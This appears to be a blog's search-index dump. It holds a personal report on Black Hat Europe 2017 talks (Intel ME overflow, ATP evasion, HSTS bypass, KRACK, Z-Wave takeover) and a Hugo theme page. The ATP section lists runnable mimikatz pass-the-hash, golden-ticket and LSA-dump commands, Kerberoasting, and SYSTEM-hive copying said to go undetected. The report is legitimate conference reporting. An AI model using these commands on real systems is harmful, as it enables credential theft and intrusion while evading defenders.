Operation Blockbuster Goes Mobile, November 20, 2017. https://researchcenter.paloaltonetworks.com/2017/11/unit42-operation-blockbuster-goes-mobile/ TechNet Archive, Using a Host-Guest communication channel in Windows Virtual PC, October 13, 2009. https://blogs.technet.microsoft.com/windows_vpc/2009/10/13/using-a-host-guest-communication-channel-in-windows-virtual-pc/ ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:2:7","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"How to Hack a Turned-Off Computer, or Running Unsigned Code in Intel Management Engine Mark Ermolov \u0026 Maxim Goryachy from Positive Technologies They revealed CVE-2017-5705,6,7 (3). As Mark Ermolov tweet says, their vulnerability depends on MFS. There are few vulnerabilities in the ME, but only 1 allows execution of arbitrary code on ME! But, now, there is two. Potentials attack vectors: Local communication interface (HECI): Separated PCI device, it exchanges messages between the main system and the ME. Network (vPro only): ATM is a large module, so a lot of code. But only available in business systems. IPMI/MCTP: ?? Host memory (UMA): AES encryption with integrity checking. Firmware SPI layout: Needs intel private key to exploit a bug in parsing procedure of signed data. Moreover, the firmware is not vulnerable to “evil SPI flash” attack in general. Internal file system: It refers to the previous briefing by imitry SKLYAROV The architecture of the ME shows 2 issues: A process can create another process which is more privileged than itself. Access to internal devices completely breaks the security model. In high privileged modules, we meet BUP, as we saw with first ME briefing. BUP can create a child process, and of course, choose its privilege. Also, this module exists on all platforms, has access to security sensitive hardware, can bypass MFS protection, one of the largest modules (more code = more attack vector) and interacts with the host via HECI. In the processing of reverse engineering, they find a buffer overflow vulnerability in the Trace hub initialization. Here is the function code: void __cdecl bup_init_trace_hub () { int err; // eax eax signed int npk_reg_idx; // ebx ebx unsigned int bytes_read; // [esp+0h] [ebp-350 h] unsigned int file_size; // [esp+4h] [ebp-34 Ch] int si_features[5]; // [esp+8h] [ebp-348 h] int ct_data[202]; // [esp+1Ch] [ebp-334 h] 808 bytes int cookie; // [esp+344h] [ebp - Ch] cookie = gRmlbCookie; memset (si_features, 0, 0x14u); bytes_read = 0; file_size = 0; if (!(getDW_sel (0xBF,0xE0u) \u0026 0x1000000) \u0026\u0026 !bup_get_si_features (si_features) \u0026\u0026 !bup_dfs_get_file_size (\"/home/bup/ct\", \u0026file_size)) { if (file_size){ LOBYTE (err) = bup_dfs_read_file (\"/home/bup/ct\", 0, ct_data, file_size, \u0026bytes_read); npk_reg_idx = 0; if (!err) { while (npk_reg_idx \u003c HIWORD (ct_data[1])) { if (HIBYTE (ct_data[2 * npk_reg_idx + 2]) == 1) putDW_sel (0xB7, ct_data[2 * npk_reg_idx + 2] \u0026 0xFFFFF, ct_data[2 * npk_reg_idx + 3]); if (HIBYTE (ct_data[2 * npk_reg_idx + 2]) == 2) putDW_sel (0xBF, ct_data[2 * npk_reg_idx + 2] \u0026 0xFFFFF, ct_data[2 * npk_reg_idx + 3]); ++npk_reg_idx; } bup_switch_tracer (0xB7, 0xBF u); } } } if (gRmlbCookie != cookie) sys_fault (); } So the vulnerability is here, but there is a stack protection against buffer overflow, the stack cookie: void __cdecl bup_init_trace_hub () { [...] int ct_data[202]; // [esp+1Ch] [ebp-334 h] 808 bytes int cookie; // [esp+344h] [ebp - Ch] cookie = gRmlbCookie; [...] if (!(getDW_sel (0xBF,0xE0u) \u0026 0x1000000) \u0026\u0026 !bup_get_si_features (si_features) \u0026\u0026 !bup_dfs_get_file_size (\"/home/bup/ct\", \u0026file_size)) { if (file_size){ LOBYTE (err) = bup_dfs_read_file (\"/home/bup/ct\", 0, ct_data, file_size, \u0026bytes_read); [...] if (gRmlbCookie != cookie) // Stack protection sys_fault (); } The /home/bup/ct is an unsigned file from fitc.cfg (cf. First presentation): The stack cookie implements: Each process has unique value for stack cookie 32 bits value is obtained from hardware random number generator Stored is nonvolatile process memory If cookie changed, the process exited To bypass the protection they decided to intercept the execution flow and exploit the buffer overflow before the cookie checking. To do that, in the code above, we can see the bup_dfs_read_file that indirectly call a memcpy function. Then, they have the destination address of the structure they named Tread Local Storage (TLS). In BUP read/write functions obtains and records data via a shared memory mechanism. Becau","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:2:8","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Goodies hunting part 1 At the end of the first day, with @razaborg we tried some challenge offered by companies in the business hall, and getting some goodies! The challenge tested (by a company whose I forgot the name, really sorry :X), was an IP camera inside a box with digital code protection. Numbers were hidden on the presentation stand, we find 3 on the 6, not enough, unfortunately… ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:2:9","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Day 2 ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:3:0","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Red Team Techniques for Evading, Bypassing, and Disabling MS Advanced Threat Protection and Advanced Threat Analytics Chris THOMPSON (@retBandit) from IBM X-Forced Red Step in a red team mission: External recon Gain a Foothold Host recon Internal recon Lateral movement Dominance Obfuscated PowerShell script triggered Advanced Threat Protection (ATP). ATP includes machine learning and AMSI. Defender ATP =/= Defender AV Misc techniques to gain the initial foothold: * Obfuscated JScript/VBScript THAT DON’T USE KERNEL32 API. * Using signed exec’s to load a Cobalt stageless payload. * Some executables created with Veil (Go) and Shellter. Not detected: WMI wmic process list brief wmic group list brief wmic computersystem list wmic process list /format:list wmic ntdomain list /format:list wmic useraccount list /format:list wmic group list /format:list wmic sysaccount list /format:list wmic /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * Get-WmiObject -Class Win32_UserAccount -Filter \"LocalAccount='True'\" Use MSF modules with local WinAPI calls, such as file_from_raw_ntfs.rb, don’t use local_admin_search_enum.rb. CobaltStrike has a number of modules that are API-only. Avoid AMSI Userland Persistence and AMSI Bypass via Component Object Model Hijacking. ATP can’t be stopped or uninstalled, even with a SYSTEM account, because of Protected Process Light. But it’s possible to block ATP communications via DiagTrack Service. Hijack DLL to remove PPL protection? (personal note: not sure) Mimikatz driver is registered as malicious now, but you change the service name and re-sign it. It’s possible to block all Windows Defender/ATP Comms via Firewall (1 page 42) Not detected: Using LDAP/Powerview to gather computers/users. Get-NetComputer -verbose -domain prod.local Get-NetGroupMember -GroupName \"Enterprise Admins\" -Domain dev.local -verbose Not detected: Enumeration via WMI Local Name Space Domain User Accounts: Get-WmiObject -Class Win32_UserAccount -Filter \"Domain='dev' AND Disabled='False'\" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired, PasswordChangeable, Description, SID Domain Groups: Get-ComInstance -ClassName Win32_Group -Filter \"Domain = 'dev' AND Name like '%Admin%'\" Domain Group User Memberships: Get-CimInstance -ClassName Win32_Group -Filter \"Domain = 'dev' AND Name='Enterprise Admins'\" | Get-CimAssociatedInstance - Association Win32_GroupUser Get-CimInstance -ClassName Win32_Group -Filter \"Domain = 'dev' AND Name='Microsoft Advanced Threat Analytics Administrator'\" | Get-CimAssociatedInstance - Association Win32_GroupUser Not detected: SPN Enumeration \u0026 Kerberoasting Get-NetComputer -SPN mssql* Get-NetUser -SPN | Get-SPNTicket -OutputFormat Hashcat Not detected: Silver ticket The golden ticket is a forged TGT, Silver ticket is a forged TGS. No DC server contacted. Not detected: Enumerating AD Access Control Entries Invoke-BloodHound -CollectionMethod ACL -ExcludeDC Not detected: Escalation via Selective AD ACL Abuse Add-DomainGroupMember -Identity sql01admins -Members edwardabbey Set-DomainUserPassword -Identity webservice -AccountPassword$Password Over-Pass-The-Hash is detected using KRBTGT NTLM hash. Not detected: Over-Pass-The-Hash using all hash/keys. In a mimikatz console: sekurlsa::pth /user:administrator /domain:prod.local /aes256:\u003cdata\u003e /ntlm:\u003chash\u003e /aes128:\u003cdata\u003e Lateral movement via SQL Auth is not detected. For the dominance. Not detected: PowerSploit: Mimikatz in memory w/ LSASS injection Invoke-Mimikatz -Command '\"privilege::debug\" \"LSADump::LSA /inject\"' -Computer dc03.prod.local Not detected: PowerSploit: Ninja-Copy (PSRemoting with Raw Disk Access) Invoke-NinjaCopy -Path \"c:\\Windows\\System32\\config\\SYSTEM\" -ComputerName \"dc03.prod.local\" -LocalDestination \"c:\\temp\\system\" Not detected: Golden ticket w/ AES Key In mimikatz console: kerberos::golden /user:JohnVanwagoner /domain:prod.local /sid:sid /aes256:aes256 /groups:512,513,519 /startoffset:-1 /endin:2500 /renew","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:3:1","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Breaking Out HSTS (and HPKP) on Firefox, IE/Edge and (Possibly) Chrome Sheila Ayelen Berta \u0026 Sergio De Los Santos from ElevenPaths Most of the MITM attacks doesn’t work anymore today. That’s why HSTS and HPKP are created. When a user is connected to an HSTS website, the first time the client connects to the port 80 of the website and he is redirected to the 443 port. With HSTS, next time client connects to the website, it will be automatically on the 443 port, then SSLStrip is useless. HPKP will get the certificate signature, or “certificate pinning” and compares it at every connection. If the signature is modified, then the browser drop the connection. Firefox To remember which site has HSTS and who is the owner of each certificate signature, Firefox uses a small text file (SiteSecurityServiceState.txt). In the Firefox source code, this plain text file can take 1024 entries maximum. With cloudspinning researchers sent a lot of HSTS data to the target Firefox. When 1024 entries are exceeded, the original results in the plain text are erased. Then the client will need to go to the 80 port again, and if you start SSLStrip at the right moment, you’re MITM is perfectly performed. To playing with the Score columns, you can use the Delorean script (2). Chrome Chrome runs the same system as Firefox, but there is no limit on this text file. Problem solved? Not really… Even if there is no limit, Chrome will store every result in the file. If you send a lot of requests, just as with Firefox during a couple of minutes, 10⁄15 or more, this file will become very huge (200⁄300 Mo). Each request sent by Chrome is analyzed with this file to know if we can use HSTS or HPKP. Then Chrome is unusable at all, because browsing a 400 Mo file is slow! Then, you have to wipe all data. The same thing as Firefox, SSLStrip will work now. Internet Explorer/EDGE IE/EDGE doesn’t use a simple text file, they use a database. Now, there is two important point here: The lack of documentation IE does not support HPKP HSTS in IE/EDGE is managed by WinInet.dll. Due to problems in the storage process, not all HSTS website is remembered. Then if you clear the cache, the user hasn’t a real HSTS protection. From a personal point of view, before this briefing I just had a little idea of how HSTS and HPKP works. The presentation was very clear and interesting. Source documents Sheila Ayelen Berta \u0026 Sergio De Los Santos, Black hat presentation, Thursday, December 7, 2017. https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf PentesterES, [GitHub] Tools to bypass FF, Chrome and IE HSTS/HPKP protection. https://github.com/PentesterES/Delorean ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:3:2","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Key Reinstallation Attacks: Breaking the WPA2 Protocol Mathy Vanhoef from KU Leuven In the WPA2 process, there are 3 step: Pairing step 4-Way Handshake Group Key Handshake The KRACK vulnerability is in the 4-Way Handshake. Here is a standard 4-Way Handshake: PTK = PRF(PMK, ANonce, SNonce, MAC client, MAC point d’accès) PRF: Hashing function based on HMAC using SHA1 PMK: hash(SSID + Access point key) Packet Number (PN): Incremental counter initialized to 0 at the beginning of the 4-Way Handshake, used to generate PMK. According to the 802.11r: FT - Fast Basic Service State Transition If the access point never receives the last transmission of the 4-Way Handshake, it has to resend first message (ANonce + Access point MAC) and third message (“I generated the PTK!”). Each third message received by the client, it has to update the PN counter with the one received by the access point. If an attacker intercepts the fourth message, then the client will continue to communicate normally (encrypted communication), but after few moment the access point will timeout and resend 1st en 3rd transmission. According to the norms, the client will reinstall the PN counter. WPA2 cipher broken. After that, it’s easy to decrypt the network flow. Because GCMP and TKIP allow injection and forge of the new packet, then you can forge known packet and send him to the access point or client and received the encrypted packet. Then: known_clear_packet XOR known_encrypt_packet = XOR_KEY unknown_encrypted_packet XOR XOR_KEY = unknown_clear_packet Interesting fact, the WPA_Supplicant implement in Linux and Android will not reinstall the PTK with Access point PN counter after the fourth request. It will simply erase the PTK and replace it with 0. From a personal point of view, I’m a bit frustrated by this presentation. He didn’t go very far technically, just presented his paper (available on the internet). Also, Mathy Vanhoef didn’t release his tool, maybe in the 34C3… Source documents Mathy Vanhoef. [Paper] Key Reinstallation Attack, Thursday, December 7, 2017. https://papers.mathyvanhoef.com/blackhat-eu2017.pdf. Mathy Vanhoef. Krack Attack – Breaking WPA2 by forcing nonce reuse, https://www.krackattacks.com/ Mathy Vanhoef, [GitHub] Test equipment. https://github.com/vanhoefm/krackattacks-scripts Hackndo aka Pixis. [GitHub] Krack PoC, https://github.com/Hackndo/krack-poc Hackndo aka Pixis, KRACK casser le WPA2, http://beta.hackndo.com/krack/ ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:3:3","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"A Universal Controller to Take Over a Z-Wave Network Loïc ROUCH (speaker), Jérôme FRANÇOIS, Frédéric BECK from INRIA Nancy There is two mode in Z-wave: unsecure \u0026 secure. Loïc ROUCH explains how the unsecure mode can be exploited to make a universal controller. The target network looks to: The attacker will need: Z-Wave controller DVB-T tuner There is a HomeID/NodeID for the master and only NodeID for the slave. During association and pairing, the master will send his HomeID to the slave. Then, the attack is based on the HomeID. You have to get it and replay it to control all associated slaves. The DVB-T Tuner is necessary to get the HomeID (3): rtl_sdr -f 868420000 -s 2000000 -g 25 - | ./wave-in -u First fourth bytes are the HomeID. Through the Backup and restore function, they restore the stolen HomeID. But, impersonate the new HomeID doesn’t mean that you have the control of all slave. Not yet. With the Z-Wave controller, you just have to scan the Network and slaves will connect to you. From a personal point of view it was a cool presentation, unfortunately, the demonstration didn’t work. Maybe I’ll try to reproduce this later :-) Source documents Loïc ROUCH, Jérôme FRANÇOIS \u0026 Frédéric BECK, [Paper] A Universal Controller to Take Over a Z-Wave Network, Thursday, December 7, 2017. https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network-wp.pdf Loïc ROUCH, Jérôme FRANÇOIS \u0026 Frédéric BECK, Black hat presentation, Thursday, December 7, 2017. https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network.pdf Baol, [GitHub] Waving-Z. https://github.com/baol/waving-z ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:3:4","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Goodies hunting part 2 With @razaborg again, we wanted to try the NCC Group challenge. This challenge was in 2 parts, first, we started with a commercial invoice and a QR Code. After that, NCC Group employee gave us an NFC card. First step: Decoding QR code Decoding Base64 Replacing data with right information (found in commercial invoice) Re-encoding in Base64 Re-generating the QR Code Second step: Scan NFC card Bunch of data -\u003e Dcode helps us, it was Caesar shift 10 Replacing with right data (according to the commercial invoice again) Re-generation of an MD5 hash -\u003e we had to “brute-force” it. Re-shifting Flashing the NFC card w00t \\o/ Here is a picture of my loot: ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:3:5","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Others briefing ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:4:0","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Arsenal The Arsenal was little presentation stand and people introduced their tools. All tools are available on that GitHub: https://github.com/toolswatch/blackhat-arsenal-tools From a personal point of view Arsenal is really great to make known people, I think I will try in BH 2018 with Auto-Vol! :-D ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:5:0","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":["Posts"],"content":"Conclusion I think it’s my best event at this time! Briefings were crazy, arsenal tools were crazy too and there was a lot of goodies! I also met nice people, such as: @PaulWebSec @lyon01_david @_Bytemare @SaxX Feel free to contact me on Twitter or by email! See you soon :-D Thanks to Nicolas TERRIEN for his english skills! :D ","date":"2017-10-03","objectID":"maki.bzh/bheu2017/:6:0","tags":["bheu","friends","intel me","cti","feedback","maki life","goodies"],"title":"Feeback of Black Hat Europe 2017","uri":"maki.bzh/bheu2017/"},{"categories":null,"content":"About LoveIt","date":"2019-08-02","objectID":"maki.bzh/about/","tags":null,"title":"About LoveIt","uri":"maki.bzh/about/"},{"categories":null,"content":"  LoveIt is a clean, elegant but advanced blog theme for Hugo developed by  Dillon. It is based on the original LeaveIt Theme and KeepIt Theme. Hugo Theme LoveIt ","date":"2019-08-02","objectID":"maki.bzh/about/:0:0","tags":null,"title":"About LoveIt","uri":"maki.bzh/about/"},{"categories":null,"content":"Features ","date":"2019-08-02","objectID":"maki.bzh/about/:1:0","tags":null,"title":"About LoveIt","uri":"maki.bzh/about/"},{"categories":null,"content":"Performance and SEO  Optimized for performance: 99/100 on mobile and 100/100 on desktop in Google PageSpeed Insights  Optimized SEO performance with a correct SEO SCHEMA based on JSON-LD  Google Analytics supported  Fathom Analytics supported  Plausible Analytics supported  Yandex Metrica supported  Search engine verification supported (Google, Bind, Yandex and Baidu)  CDN for third-party libraries supported  Automatically converted images with Lazy Load by lazysizes ","date":"2019-08-02","objectID":"maki.bzh/about/:1:1","tags":null,"title":"About LoveIt","uri":"maki.bzh/about/"},{"categories":null,"content":"Appearance and Layout  Desktop/Mobile responsive layout  Light/Dark mode  Globally consistent design language  Pagination supported  Easy-to-use and self-expanding table of contents  Multilanguage supported and i18n ready  Beautiful CSS animation ","date":"2019-08-02","objectID":"maki.bzh/about/:1:2","tags":null,"title":"About LoveIt","uri":"maki.bzh/about/"},{"categories":null,"content":"Social and Comment Systems  Gravatar supported by Gravatar  Local Avatar supported  Up to 73 social links supported  Up to 24 share sites supported  Disqus comment system supported by Disqus  Gitalk comment system supported by Gitalk  Valine comment system supported by Valine  Facebook comments system supported by Facebook  Telegram comments system supported by Comments  Commento comment system supported by Commento  utterances comment system supported by utterances  giscus comment system supported by giscus ","date":"2019-08-02","objectID":"maki.bzh/about/:1:3","tags":null,"title":"About LoveIt","uri":"maki.bzh/about/"},{"categories":null,"content":"Extended Features  Search supported by Lunr.js or algolia  Twemoji supported  Automatically highlighting code  Copy code to clipboard with one click  Images gallery supported by lightGallery  Extended Markdown syntax for Font Awesome icons  Extended Markdown syntax for ruby annotation  Extended Markdown syntax for fraction  Mathematical formula supported by $\\KaTeX$  Diagrams shortcode supported by mermaid  Interactive data visualization shortcode supported by ECharts  Mapbox shortcode supported by Mapbox GL JS  Music player shortcode supported by APlayer and MetingJS  Bilibili player shortcode  Kinds of admonitions shortcode  Custom style shortcode  Custom script shortcode  Animated typing supported by TypeIt  Cookie consent banner supported by cookieconsent  Person shortcode … ","date":"2019-08-02","objectID":"maki.bzh/about/:1:4","tags":null,"title":"About LoveIt","uri":"maki.bzh/about/"},{"categories":null,"content":"License LoveIt is licensed under the MIT license. Check the LICENSE file for details. ","date":"2019-08-02","objectID":"maki.bzh/about/:2:0","tags":null,"title":"About LoveIt","uri":"maki.bzh/about/"},{"categories":null,"content":"Special Thanks Thanks to the authors of following resources included in the theme: normalize.css Font Awesome Simple Icons Animate.css autocomplete Lunr.js algoliasearch lazysizes object-fit-images Twemoji emoji-data lightGallery clipboard.js Sharer.js TypeIt $\\KaTeX$ mermaid ECharts Mapbox GL JS APlayer MetingJS Gitalk Valine cookieconsent ","date":"2019-08-02","objectID":"maki.bzh/about/:3:0","tags":null,"title":"About LoveIt","uri":"maki.bzh/about/"}]